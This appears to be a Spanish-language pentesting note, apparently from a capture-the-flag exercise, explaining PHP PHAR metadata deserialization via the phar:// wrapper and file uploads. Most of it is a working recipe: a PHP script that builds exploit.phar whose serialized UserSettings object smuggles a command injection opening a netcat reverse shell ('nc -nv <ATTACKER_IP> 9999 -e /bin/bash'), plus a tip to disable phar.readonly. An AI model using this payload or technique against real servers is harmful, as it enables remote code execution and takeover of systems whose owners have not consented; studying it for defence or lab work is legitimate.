### INFO

- PHAR es una extensión de PHP.
- Permite guardar una aplicación entera PHP dentro de un archivo.
- Es similar a los JAR de java.
- Se acceden a los archivos dentro del mismo usando el wrapper phar://archivo

### Explotación

- Los phar tienen muchas propiedades, entre ellas la que nos es más importante es la metadata.
- Según la documentación de PHP (https://www.php.net/manual/en/phar.getmetadata.php) toda variable suceptible de ser serializada califica como metadata.
- Hasta php 8.0 toda metadata es deserializada de manera automática cuando se parsea un phar.
- Parsear un phar consta de llamar al archivo con el wrapper phar://
- Esto funciona incluso cuando los archivos son subidos con otras extensiones como JPG.


A modo de ejemplo, supongamos que encontramos un file upload, podríamos generar un phar con el siguiente procedimiento:
1) Creamos un archivo .php con el siguiente código:

    <?php
    include('UserSettings.php');
    
    $phar = new Phar("exploit.phar");
    
    $phar->startBuffering();
    
    $phar->addFromString('0', '');
    $phar->setStub("<?php __HALT_COMPILER(); ?>");
    $phar->setMetadata(new \App\Helpers\UserSettings('"; nc -nv <ATTACKER_IP> 9999 -e /bin/bash;#', 'attacker@htbank.com', '$2y$10$u5o6u2EbjOmobQjVtu87QO8ZwQsDd2zzoqjwS0.5zuPr3hqk9wfda', 'default.jpg'));
    
    $phar->stopBuffering();


  2) Lo ejecutamos y este nos va a crear el archivo exploit.phar
#####  Si tenemos el siguiente error:
    PHP Fatal error:  Uncaught UnexpectedValueException: creating archive "exploit.phar" disabled by the php.ini setting phar.readonly in XXXXX
Stack trace:
#0 XXXXX: Phar->__construct()
#1 {main}
  thrown in XXXXX on line XX

##### Podemos solucionarlo cambiando la propiedad phar.readonly = On a Off dentro del archivo:
    /etc/php/<php version>/cli/php.ini

